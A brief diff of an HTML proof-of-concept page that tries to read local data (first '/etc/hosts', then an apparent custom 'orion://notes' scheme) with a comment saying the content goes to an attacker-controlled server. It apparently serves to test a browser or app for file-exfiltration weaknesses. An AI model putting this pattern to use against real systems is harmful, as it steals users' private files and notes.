@@ -10,7 +10,7 @@
 
   <script>
     // Attempt to read the local file
-    fetch('file:///etc/hosts')
+    fetch('orion://notes')
       .then(response => response.text())
       .then(data => {
         // If successful, send the content to attacker-controlled server
@@ -26,5 +26,6 @@
   </script>
 </body>
 </html>
+
 
 
